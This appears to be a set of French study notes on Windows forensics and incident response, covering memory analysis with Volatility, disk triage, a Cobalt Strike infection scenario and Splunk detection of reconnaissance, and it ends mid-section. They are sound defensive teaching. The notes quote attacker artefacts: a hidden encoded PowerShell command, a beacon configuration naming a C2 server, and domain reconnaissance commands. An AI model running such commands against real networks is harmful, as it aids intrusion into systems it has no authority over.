Les m√©thodes de persistance permettent aux attaquants de conserver l'acc√®s √† un syst√®me. Ces m√©thodes exploitent des composants syst√®me comme les cl√©s de registre, les t√¢ches planifi√©es et les services.
Cl√©s de registre pour la persistance
Run/RunOnce :
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Run
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Cl√©s WinLogon :
HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Cl√©s de d√©marrage :
HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
T√¢ches planifi√©es (Schtasks)

Les t√¢ches planifi√©es dans C:\Windows\System32\Tasks sont stock√©es sous forme de fichiers XML, d√©taillant les horaires et les commandes des t√¢ches. Ces fichiers doivent √™tre examin√©s pour rep√©rer les entr√©es suspectes.
Services

Les services Windows ex√©cutent des processus en arri√®re-plan. Les acteurs malveillants peuvent cr√©er ou modifier des services pour maintenir la persistance. La cl√© de registre pour les services est : HKEYLOCALMACHINE\System\CurrentControlSet\Services.
Forensique des navigateurs web

L'analyse des navigateurs web peut r√©v√©ler les habitudes de navigation, les interactions de l'utilisateur et des actions potentiellement nuisibles. Les artefacts cl√©s incluent :
Historique de navigation : Suit les sites visit√©s, les horodatages et la fr√©quence.
Cookies : Stocke les d√©tails de session, les pr√©f√©rences et les donn√©es d'authentification.
Cache : Contient les pages web et images en cache, montrant les sites acc√©d√©s m√™me si l'historique a √©t√© effac√©.
Favoris : Indique les pages fr√©quemment visit√©es.
Historique des t√©l√©chargements : Liste les fichiers t√©l√©charg√©s, leurs URL d'origine et les horodatages.
Donn√©es de remplissage automatique : Stocke les informations pour les formulaires (par exemple, noms, adresses).
Donn√©es de session : Suivent les sessions actives, les onglets et les fen√™tres ouvertes.
Extensions et modules compl√©mentaires : Liste des extensions install√©es et leurs configurations.
SRUM (System Resource Usage Monitor)

Introduit dans Windows 8, SRUM suit l'utilisation des applications et des ressources. Localis√© dans C:\Windows\System32\sru\sru.db, cette base de donn√©es SQLite enregistre les profils des applications et l'utilisation des ressources, aidant √† :
Profilage des applications : Affiche les applications ex√©cut√©es et leurs chemins.
Consommation des ressources : Enregistre l'utilisation du CPU, du r√©seau et de la m√©moire.
Reconstruction de la chronologie : Construit une chronologie de l'utilisation des applications et des √©v√©nements syst√®me.
Contexte utilisateur et syst√®me : Associe les activit√©s √† des utilisateurs sp√©cifiques, ce qui aide √† identifier les acteurs malveillants.
D√©tection des malwares : Suivit les mod√®les inhabituels d'applications ou de ressources, ce qui peut indiquer la pr√©sence de malwares.
R√©ponse aux incidents : Fournit des informations rapides sur les activit√©s r√©centes pour une r√©ponse rapide aux menaces.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Evidence Acquisition Techniques &amp; Tools</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fb-96a0-f4103302a8cc"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Acquisition de preuves en criminalistique num√©rique

L'acquisition de preuves est cruciale en criminalistique num√©rique et implique la collecte minutieuse des donn√©es provenant de diverses sources pour en garantir l'authenticit√© et l'admissibilit√© l√©gale.
Imagerie Forensique

L'imagerie forensique consiste √† cr√©er une copie exacte, bit par bit, des supports de stockage, essentielle pour pr√©server l'√©tat d'origine des donn√©es. Les outils pour l'imagerie forensique incluent :
FTK Imager : Permet de cr√©er des copies parfaites de disques, de visualiser et d'analyser des donn√©es sans alt√©ration.
AFF4 Imager : Outil open-source prenant en charge plusieurs syst√®mes de fichiers avec des capacit√©s d'imagerie compress√©e.
DD et DCFLDD : Utilitaires en ligne de commande sous Unix ; DCFLDD inclut des am√©liorations sp√©cifiques √† la criminalistique, comme le hachage.
Outils de Virtualisation : Utilis√©s pour acqu√©rir des images de environnements virtuels, souvent via des instantan√©s.

Exemple : Imagerie avec FTK Imager
S√©lectionner Fichier &gt; Cr√©er une Image Disque.
Choisir la source (disque physique/logique) et sp√©cifier la destination.
D√©finir le type d‚Äôimage, la fragmentation et la compression, puis d√©marrer.
Apr√®s l‚Äôimagerie, FTK Imager v√©rifie et r√©sume les r√©sultats.

Exemple : Montage de l‚Äôimage disque avec Arsenal Image Mounter
Lancer Arsenal Image Mounter en tant qu'administrateur.
Monter l‚Äôimage en mode lecture seule pour maintenir l'int√©grit√©.
L‚Äôimage appara√Æt comme un lecteur, par exemple D:.
Extraction de preuves bas√©es sur l‚Äôh√¥te &amp; Triage rapide

Les preuves bas√©es sur l‚Äôh√¥te incluent les artefacts provenant des syst√®mes d'exploitation comme Windows, g√©n√©r√©s par l'ex√©cution d'applications, les modifications de fichiers et l'activit√© des utilisateurs. L'acquisition des preuves se classe selon la volatilit√© des donn√©es :
Donn√©es Volatiles : Captur√©es √† partir de la m√©moire active, elles incluent le contenu de la m√©moire vive, souvent porteur de traces de malwares.
Outils d'acquisition de m√©moire :
WinPmem : Outil open-source pour la capture de la m√©moire sur Windows.
DumpIt : Outil simple pour les captures de m√©moire sur Windows/Linux.
MemDump : Outil CLI pour capturer la RAM du syst√®me.
Magnet RAM Capture : Outil gratuit de capture de m√©moire de Magnet Forensics.

Exemple : Acquisition de m√©moire avec WinPmem

C:\Users\X\Downloads&gt; winpmemminix64_rc2.exe memdump.raw
Donn√©es Non-volatiles : Persistant sur disque, elles incluent des entr√©es de registre, des journaux d'√©v√©nements Windows, et des artefacts syst√®me ou applicatifs.

Triage rapide avec KAPE

KAPE (Kroll Artifact Parser and Extractor) acc√©l√®re la collecte de preuves en r√©cup√©rant les artefacts essentiels.
Cibles : D√©finir les donn√©es √† collecter, stock√©es sous forme de fichiers .tkape dans le r√©pertoire KAPE\Targets.
Ex√©cution :
D√©finir les chemins source (D:) et destination.
Utiliser gkape.exe (interface graphique) pour configurer les options et d√©marrer la collecte.
Les r√©sultats incluent \$MFT et d'autres r√©pertoires syst√®me dans le r√©pertoire de sortie.

Collecte √† distance avec EDR &amp; Velociraptor
Solutions EDR : Facilitent la collecte √† distance de preuves, avec des capacit√©s de recherche sur les r√©seaux.
Velociraptor : Utilise des requ√™tes VQL et des recherches pour collecter des artefacts comme Windows.KapeFiles.Targets.
Extraction de preuves r√©seau

L‚Äôanalyse des preuves r√©seau est fondamentale pour les analystes SOC, impliquant des outils et des sources de donn√©es qui capturent et interpr√®tent le trafic r√©seau.
Capture de Trafic : Des outils comme Wireshark et tcpdump capturent les paquets pour analyser la communication r√©seau.
Syst√®mes IDS/IPS : Les syst√®mes IDS (Intrusion Detection Systems) d√©tectent, tandis que les syst√®mes IPS (Intrusion Prevention Systems) d√©tectent et bloquent les activit√©s suspectes.
Donn√©es de Flux de Trafic : Des outils comme NetFlow fournissent des aper√ßus du comportement du trafic √† un niveau global.
Journaux de Pare-feu : Fournissent des informations sur les tentatives d'exploitation et les tentatives d'acc√®s non autoris√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Memory Forensics</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80d0-9232-c7eda69e95ac"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Types de donn√©es en RAM utiles pour les enqu√™tes
Connexions r√©seau
Poign√©es de fichiers et fichiers ouverts
Cl√©s du registre
Processus en cours
DLLs et pilotes charg√©s
Historique des commandes de la console
Identifiants des utilisateurs
Artifacts de logiciels malveillants
Configurations syst√®me
Processus de criminalistique m√©moire
Identification et v√©rification des processus
√ânum√©rer les processus en cours, valider leurs origines et les comparer aux processus l√©gitimes connus.
Analyse des composants du processus
Examiner les DLLs et poign√©es associ√©es, rechercher des injections non autoris√©es.
Revue de l'activit√© r√©seau
Analyser les connexions actives, les IP et les domaines pour retracer les communications externes.
D√©tection des injections de code
Identifier des techniques comme l'hollowing de processus en examinant les anomalies de m√©moire.
D√©tection de rootkits
Identifier des malwares profonds qui s'int√®grent dans le syst√®me d'exploitation en utilisant des privil√®ges √©lev√©s.
Extraction des √©l√©ments suspects
Isoler les composants suspects pour un examen forensique d√©taill√©.
Le cadre Volatility
Vue d'ensemble

Volatility est un outil de criminalistique m√©moire open-source utilis√© sur diverses plateformes pour analyser des images m√©moire sur diff√©rents syst√®mes d'exploitation, tels que Windows, macOS et Linux.
Modules courants de Volatility
pslist : Liste des processus en cours.
cmdline : Affiche les arguments de ligne de commande.
netscan : Identifie les connexions r√©seau.
malfind : D√©tecte les codes malveillants dans les processus.
handles : Liste des poign√©es ouvertes.
svcscan : Analyse des services Windows.
dlllist : Liste des DLLs charg√©es.
hivelist : Liste des ruches du registre en m√©moire.
Exemples d'utilisation de Volatility
Aide √† l'utilisation de Volatility :

   vol.py --help
   Lister les processus en cours :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 pslist
   Analyse des artefacts r√©seau :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 netscan
   D√©tecter le code inject√© :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 malfind --pid=608
   Lister les DLLs charg√©es pour un processus sp√©cifique :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 dlllist -p 1512
   Lister les services Windows :

   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 svcscan
   D√©tection de rootkits avec les plugins psscan et pslist

Le plugin psscan r√©v√®le les processus cach√©s par des rootkits :

vol.py -f /path/to/rootkit.dump psscan
Analyse m√©moire avec Strings
Recherche d‚Äôadresses IPv4 :

   strings /path/to/memory.dump | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
   Extraction d‚Äôadresses e-mails :

   strings /path/to/memory.dump | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b"
   Artifacts de ligne de commande :

   strings /path/to/memory.dump | grep -E "(cmd|powershell|bash)[^\s]+"
   </code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Disk Forensics</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802d-b901-c371aaad6f1d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Fonctionnalit√©s Cl√©s pour la Criminalistique sur Disque
Vue de la Structure des Fichiers : Offre une vue navigable du syst√®me de fichiers, permettant un acc√®s rapide aux r√©pertoires et fichiers sp√©cifiques. Cette fonctionnalit√© est essentielle pour localiser les fichiers suspects.
Visionneuse Hexad√©cimale : Permet l'inspection d√©taill√©e des fichiers au format hexad√©cimal, particuli√®rement utile pour analyser des malwares personnalis√©s ou des exploits sp√©cifiques.
Analyse des Artefacts Web : Permet l‚Äôanalyse des donn√©es li√©es √† la navigation web, comme l'historique de navigation et les fichiers mis en cache, ce qui est crucial pour suivre les activit√©s menant √† un incident.
R√©cup√©ration des Emails : Extrait et affiche les donn√©es des emails √† partir des images disque, ce qui est souvent pr√©cieux lors de l'enqu√™te sur des menaces internes ou des attaques bas√©es sur des communications.
Visionneuse d'Images : Facilite l'affichage des images stock√©es sur le syst√®me, potentiellement utile pour des v√©rifications de politique ou pour identifier du contenu ill√©gal.
Analyse des M√©tadonn√©es : Fournit des informations sur les attributs des fichiers comme les dates de cr√©ation, les heures de modification et les hachages. Ces d√©tails aident √† √©tablir une chronologie et √† les mettre en corr√©lation avec d'autres d√©couvertes, comme les activit√©s malveillantes.

Autopsy : Vue d'Ensemble de l'Outil de Criminalistique

Autopsy est un outil de criminalistique num√©rique open-source qui repose sur le cadre Sleuth Kit. Il offre une interface conviviale avec des fonctionnalit√©s √©tendues que l‚Äôon retrouve g√©n√©ralement dans les outils commerciaux, telles que :
Navigation des Sources de Donn√©es : Permet d'explorer directement les fichiers et r√©pertoires au sein de l'image disque.
Examen des Artefacts Web : Extrait des artefacts de navigation web, comme l'historique, les favoris et les fichiers mis en cache.
Analyse des P√©riph√©riques Connect√©s : Identifie et analyse les p√©riph√©riques externes connect√©s au syst√®me.
R√©cup√©ration des Fichiers Supprim√©s : R√©cup√®re les fichiers supprim√©s en scannant les secteurs du disque √† la recherche de donn√©es r√©siduelles.
Recherches par Mots-cl√©s : Permet d'effectuer des recherches approfondies sur le contenu du disque √† la recherche de mots-cl√©s sp√©cifiques.
Listes de Mots-cl√©s : Permet de rechercher de mani√®re cibl√©e en utilisant des listes de mots-cl√©s pr√©d√©finies (par exemple, noms, IPs, indicateurs de compromission).
Analyse de la Chronologie : Cartographie les √©v√©nements chronologiquement, facilitant ainsi la construction d‚Äôune chronologie pr√©cise pour l‚Äôenqu√™te.

Utilisation Pratique d'Autopsy dans l'Analyse Forensique

Une fois l‚Äôimage disque charg√©e dans Autopsy, les artefacts forensiques sont organis√©s dans la barre lat√©rale, permettant un acc√®s efficace √† :
Sources de Donn√©es : Vue de tous les fichiers et r√©pertoires.
Artefacts Web : Vue cibl√©e sur l‚Äôhistorique de navigation et les donn√©es associ√©es.
Informations sur les P√©riph√©riques : D√©tails sur les p√©riph√©riques externes connect√©s.
Fichiers Supprim√©s : Fichiers r√©cup√©r√©s et fragments marqu√©s comme supprim√©s.
Recherches par Mots-cl√©s &amp; Listes : Capacit√©s de recherche approfondie.
Analyse de la Chronologie : Affichage organis√© et chronologique des √©v√©nements syst√®me, essentiel pour comprendre la s√©quence des actions menant √† un incident.

Pour plus d'informations, consultez [Autopsy - Hack the Box Academy](https://academy.hackthebox.com/module/237/section/2611).</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Rapid Triage Examination &amp; Analysis Tools</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-804b-8eea-c8da71167143"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">T√©l√©chargement et Installation

Utilisez le lien .net 4 ou .net 6 sur le site pour les t√©l√©chargements.
Alternativement, utilisez PowerShell :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools&gt; .\Get-ZimmermanTools.ps1
Cela t√©l√©charge tous les outils dans C:\htb\dfirmodule\tools.
L'outil suit les mises √† jour par le biais de SHA-1 pour faciliter les mises √† jour.

Les Temps MAC(b) sur NTFS

Les temps MAC(b) suivent les √©v√©nements du syst√®me de fichiers :
Temps Modifi√© (M) : Derni√®re modification du contenu.
Temps Acc√©d√© (A) : Dernier acc√®s au fichier.
Temps Chang√© (C) : Modifications de la MFT.
Temps de Cr√©ation (b) : Heure de cr√©ation originale du fichier.
Exemple de Commandes

Utilisation de MFTECmd pour Inspecter les Fichiers \$MFT :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6&gt; .\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensicdata\kapeoutput\D\$MFT' --de 0x16169
Aper√ßu des Outils d'Investigation
Structure du Fichier MFT

La Master File Table (MFT) est essentielle pour suivre les fichiers sur un volume NTFS.
Les attributs du MFT comprennent \$STANDARD\INFORMATION et \$FILE\NAME.
Journaux des √âv√©nements Windows

EvtxECmd pour analyser les journaux EVTX en CSV ou JSON :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\EvtxeCmd&gt; .\EvtxECmd.exe -f "chemin\vers\log.evtx" --csv "cheminsortie"
Vous pouvez utiliser Event Query Language (EQL) pour interroger des journaux au format JSON.
Analyse du Registre Windows

RegRipper extrait des donn√©es sp√©cifiques via des plugins :

PS C:\Users\johndoe\Desktop\RegRipper3.0-master&gt; .\rip.exe -r "C:\chemin\vers\hive" -p pluginname
Registry Explorer fournit un acc√®s graphique au registre.
Artefacts d'Ex√©cution de Programme

Analyse Prefetch avec PECmd :

PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6&gt; .\PECmd.exe -f C:\chemin\vers\fichierprefetch.pf
ShimCache et Amcache : Acc√©dez √† ces artefacts via Registry Explorer pour l'historique des programmes.
Analyse Avanc√©e
Transcriptions PowerShell : Examinez les commandes PowerShell inhabituelles.
Surveillance des API : Les appels comme getenv, CreateProcessA et RegOpenKeyExA montrent des d√©tails d'interaction.
Commandes Cl√©s pour l'Analyse Forensique
Commandes PowerShell

Examinez les commandes r√©seau, les commandes encod√©es et les modules inhabituels.
Autres Scripts et Commandes Importants

Cr√©ation du format JSON EQL :

PS C:\Users\eqllib-master\utils&gt; Get-WinEvent -Path "log_path" -Oldest | Get-EventProps | ConvertTo-Json</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Practical Digital Forensics Scenario</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8014-b0c3-fc69b97721d5"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Acc√®s au syst√®me cible
Acc√®s via RDP : Connectez-vous √† l'IP cible avec les identifiants fournis.
Emplacements des preuves
Vidage m√©moire : C:\Users\johndoe\Desktop\memdump\PhysicalMemory.raw
Artifacts de triage rapide :
C:\Users\johndoe\Desktop\kapefiles
C:\Users\johndoe\Desktop\files
Image disque compl√®te : C:\Users\johndoe\Desktop\fulldisk.raw.001
Donn√©es de disque analys√©es : C:\Users\johndoe\Desktop\MalwareAttack
Notes
Analyse avec Autopsy : R√©aliser l'analyse dans le dossier C:\Users\johndoe\Desktop\MalwareAttack.
Environnement id√©al pour la criminalistique : L'analyse se fait directement sur le syst√®me compromis pour des raisons de rapidit√©, bien qu'il soit recommand√© d'utiliser un environnement s√©par√©.

Analyse m√©moire avec Volatility v3
Identification du profil m√©moire

Pour obtenir les d√©tails du syst√®me d'exploitation et du noyau √† partir du vidage m√©moire :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
Exemple de sortie :

Variable           | Valeur
-------------------|------------------------------------------------
Kernel Base        | 0xf80150019000
DTB                | 0x1ad000
Symbols            | file:///C:/Users/johndoe/Desktop/...
Is64Bit            | True
SystemTime         | 2023-08-10 09:35:40
NtSystemRoot       | C:\Windows
NtMajorVersion     | 10
NtMinorVersion     | 0
D√©tection de code inject√©

Pour trouver les r√©gions m√©moire des processus contenant potentiellement du code inject√© :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind
Exemple de sortie :

Processes with PAGEEXECUTEREADWRITE memory:
    PID 3648 (rundll32.exe), PID 6744 (powershell.exe), PID 5468 (rundll32.exe)
Explication de PAGE\EXECUTE\READWRITE :
Ce type de permission permet √† la fois l'ex√©cution et la modification du code en m√©moire, ce qui est rarement utilis√© par des applications l√©gitimes, mais couramment observ√© dans des malwares.
Identification des processus en cours

Lister les processus en cours :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist
Exemple de sortie :

PID   PPID   ImageFileName   CreateTime                    SessionId
4     0      System          2023-08-10 00:22:53.000000   N/A
3648  7148   rundll32.exe     2023-08-10 09:15:14.000000   1
6744  908    powershell.exe   2023-08-10 09:21:16.000000   1
5468  7512   rundll32.exe     2023-08-10 09:23:15.000000   0
Visualisation de l'arbre des processus

Pour voir les relations parent-enfant des processus :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree
Cela permet d'identifier les processus enfants suspects lanc√©s par des processus l√©gitimes comme rundll32.exe sous explorer.exe.
Identification des lignes de commande des processus

Pour r√©cup√©rer les arguments de ligne de commande des processus :

python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline
Exemple de sortie :

PID   Process        Args
416   csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows ...
3648  rundll32.exe   C:\Windows\System32\rundll32.exe payload.dll,StartW
6744  powershell.exe PowerShell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL...
Extraction de la m√©moire du processus et utilisation de YARA

Pour analyser le processus avec PID 3648, utilisez le plugin windows.memmap pour extraire toutes les pages m√©moire r√©sidentes de ce processus :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.memmap --pid 3648 --dump
Sortie :

0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
... (continues with memory pages)
L'image m√©moire pid.3648.dmp sera stock√©e dans le r√©pertoire C:\Users\johndoe\Desktop.
Analyse avec YARA

Pour scanner le vidage m√©moire avec les r√®gles YARA :

$rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name
foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
Sortie de YARA :

HKTLCobaltStrikeBeaconStrings
CobaltStrikeSleepDecoderIndicator
WiltedTulipReflectiveLoader
Identification des DLLs charg√©es

Examinez les DLLs charg√©es avec le plugin windows.dlllist :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.dlllist --pid 3648
Sortie :

payload.dll at E:\payload.dll, suggesting possible external or ISO origin.
Identification des poign√©es de fichiers

Utilisez windows.handles pour afficher les fichiers et les entr√©es de registre acc√©d√©es :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.handles --pid 3648
Exemple de sortie :

Access to \Device\HarddiskVolume3\Users\johndoe\Desktop
Analyse des artefacts r√©seau

Pour analyser les connexions r√©seau avec windows.netstat :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netstat
Exemple de sortie :

chrome.exe, WWAHost.exe, rundll32.exe
Utilisez windows.netscan pour une analyse r√©seau plus approfondie :

python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netscan
Exemple de sortie :

Le processus suspect (PID 3648) communique avec 44.214.212.249 via le port 80.
Analyse des donn√©es de l'image disque et triage rapide
Recherche de mots-cl√©s avec Autopsy
Ouvrir Autopsy et acc√©der au dossier C:\Users\johndoe\Desktop\MalwareAttack.
Rechercher payload.dll et prioriser par date de cr√©ation.
Extraction : Faites un clic droit sur Finance08062023.iso dans le dossier Downloads et s√©lectionnez Extraire le(s) fichier(s).
Identification des informations de t√©l√©chargement Web

La pr√©sence de .Zone.Identifier via un flux de donn√©es alternatif (ADS) confirme que le fichier provient d'Internet.

L'URL source identifi√©e dans les artefacts Web est : letsgohunt[.]site.

Analyse de la configuration du Beacon Cobalt Strike
Utilisez CobaltStrikeParser pour analyser la configuration du beacon avec le fichier payload.dll :

python parsebeaconconfig.py E:\payload.dll
Configurations cl√©s extraites :

BeaconType: HTTP, Port: 80, C2Server: letsgohunt.site,/load
Autres champs notables : HttpGetMetadata, bUsesCookies, Spawntox64.
M√©canismes de persistance avec Autoruns

Analysez les entr√©es dans C:\Users\johndoe\Desktop\files\johndoeautoruns.arn :

Une entr√©e trouv√©e :

Path: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Image: C:\ProgramData\svchost.exe
Identification des hachages de fichiers et VirusTotal

Pour identifier le hachage de photo433.exe :

PS C:\Users\johndoe&gt; Get-FileHash -Algorithm SHA256 "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\photo443.exe"
Analyse des t√¢ches planifi√©es et du timestomping

Les incoh√©rences entre les horodatages du MFT et les horodatages de fichier indiquent un possible timestomping.
Analyse des donn√©es SRUM

Exfiltration possible de 430526981 octets √† partir de \</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Windows Attacks with Splunk</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Common User &amp; Domain Recon</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8076-bb57-d04322b3d8e8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d‚Äôensemble de la reconnaissance de domaine
Concepts cl√©s
Reconnaissance du domaine Active Directory (AD) : √âtape cruciale du cycle d‚Äôattaque durant laquelle l‚Äôattaquant collecte des informations sur l‚Äôenvironnement AD. Il cherche √† identifier :
L‚Äôarchitecture, la topologie r√©seau et les m√©canismes de s√©curit√©.
Les actifs cl√©s : contr√¥leurs de domaine, comptes utilisateurs, groupes, relations de confiance, unit√©s organisationnelles (OU) et strat√©gies de groupe (GPO).
Objectif : Identifier des cibles de grande valeur, √©lever ses privil√®ges et permettre des mouvements lat√©raux.

Techniques de reconnaissance avec les commandes Windows natives

Les attaquants peuvent ex√©cuter des commandes comme net group pour obtenir la liste des administrateurs du domaine. Parmi les commandes souvent utilis√©es :
whoami /all
wmic computersystem get domain
net user /domain
net group "Domain Admins" /domain
arp -a
nltest /domaintrusts

D√©tection : Surveillez l'ex√©cution de commandes via PowerShell ou l'invite de commandes pour rep√©rer une activit√© inhabituelle.

Reconnaissance avec BloodHound / SharpHound
BloodHound : Outil open source permettant de visualiser les relations, permissions et chemins d‚Äôattaque potentiels dans Active Directory.
SharpHound : Collecteur de donn√©es (en C#) utilis√© par BloodHound, souvent lanc√© avec l‚Äôoption -c all pour un balayage complet.
M√©thodes de d√©tection de BloodHound
Requ√™tes LDAP : Les collecteurs BloodHound effectuent de nombreuses requ√™tes LDAP sur les contr√¥leurs de domaine.
Techniques de surveillance :
√âv√©nement 1644 : Surveillance des performances LDAP (limit√© en visibilit√©).
ETW (Event Tracing for Windows) via Microsoft-Windows-LDAP-Client : Utilisable avec SilkETW et SilkService, compatible avec les r√®gles Yara.
Filtres LDAP pr√©d√©finis : Utilisez ceux recommand√©s par l‚Äô√©quipe ATP de Microsoft pour d√©tecter les requ√™tes LDAP typiques li√©es √† la reconnaissance.

D√©tection de reconnaissance utilisateur/domaine avec Splunk
Objectif

D√©tecter les activit√©s de reconnaissance typiques dans un intervalle de temps donn√©, en filtrant le bruit pour se concentrer sur les √©v√©nements suspects.

D√©tection via les ex√©cutables Windows natifs

Plage temporelle : earliest=1690447949 √† latest=1690450687

index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 earliest=1690447949 latest=1690450687
| search processname IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) 
  OR (processname IN (cmd.exe,powershell.exe) AND process IN (arp,chcp,ipconfig,net,net1,nltest,ping,systeminfo,whoami))
| stats values(process) as process, min(time) as time by parentprocess, parentprocessid, dest, user
| where mvcount(process) &gt; 3
Explication
Filtrage par index et source : Recherche les √©v√©nements Sysmon (cr√©ation de processus - EventID=1) sur la p√©riode sp√©cifi√©e.
Processus cibl√©s : Se concentre sur les ex√©cutables li√©s √† des commandes de reconnaissance.
Agr√©gation statistique : Regroupe par processus parent, utilisateur, destination, et liste les processus ex√©cut√©s.
Filtrage avanc√© : Ne conserve que les √©v√©nements o√π plus de 3 commandes de reconnaissance ont √©t√© ex√©cut√©es par le m√™me processus parent.

D√©tection de reconnaissance via BloodHound

Plage temporelle : earliest=1690195896 √† latest=1690285475

index=main earliest=1690195896 latest=1690285475 source="WinEventLog:SilkService-Log"
| spath input=Message 
| rename XmlEventData. as  
| table time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 time
| search SearchFilter="(samAccountType=805306368)"
| stats min(time) as time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count &gt; 10
| convert ctime(maxTime)
Explication
Filtrage par index et source : Recherche dans les logs SilkService pendant la p√©riode d√©finie.
Extraction des champs XML : Utilisation de spath pour extraire les donn√©es structur√©es du message.
Organisation des r√©sultats : Affiche les champs cl√©s : nom de l‚Äôordinateur, nom du processus, ID du processus, filtres LDAP.
Filtrage par filtre LDAP sp√©cifique : Recherche les filtres contenant samAccountType=805306368, utilis√© par BloodHound pour identifier les comptes utilisateurs.
Agr√©gation et filtrage par fr√©quence : Signale les processus qui effectuent plus de 10 requ√™tes LDAP de ce type.
Conversion de l‚Äôhorodatage : Affiche la date et l‚Äôheure du dernier √©v√©nement au format lisible.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">D<strong>etecting Password Spraying</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809d-8d33-c758dee992bd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aper√ßu de l'attaque Password Spraying

Password Spraying est une attaque cibl√©e qui :
Tente un nombre limit√© de mots de passe courants sur plusieurs comptes d'utilisateurs.
√âvite les politiques de verrouillage de compte en utilisant seulement quelques tentatives de mot de passe par compte.
Est con√ßue pour √©chapper √† la d√©tection en exploitant des mots de passe faibles √† travers un large √©ventail d'utilisateurs, plut√¥t que de brute-forcer des comptes individuels.

Exemple : Un attaquant utilise l'outil Spray pour tester un ensemble limit√© de mots de passe sur plusieurs comptes dans un r√©seau.

Opportunit√©s de d√©tection
Indicateurs bas√©s sur les journaux pour d√©tecter le Password Spraying

Surveiller les journaux Windows pour des motifs de Password Spraying peut permettre de d√©tecter des anomalies, surtout lorsque plusieurs tentatives de connexion √©chou√©es (Event ID 4625) provenant de diff√©rents comptes utilisateurs sont effectu√©es depuis une seule adresse IP sur une courte p√©riode.

Principaux √©v√©nements √† surveiller pour la d√©tection du Password Spraying :
4625 - Connexion √©chou√©e
Suivi des √©checs de connexion pour diff√©rents comptes provenant d'une seule source.
4768 - Demande de ticket Kerberos (TGT)
ErrorCode 0x6 : Tentatives d'utilisateur invalide.
ErrorCode 0x12 : Tentatives d'utilisateur d√©sactiv√©.
4776 - Authentification NTLM
ErrorCode 0xC000006A : Utilisateurs NTLM invalides.
ErrorCode 0xC0000064 : Mauvais mot de passe NTLM.
4648 - Tentative de connexion avec des identifiants explicites
Identifie les abus de credentials.
4771 - √âchec de pr√©-authentification Kerberos

D√©tection du Password Spraying avec Splunk
Plage horaire
Earliest : 1690280680
Latest : 1690289489
Requ√™te Splunk

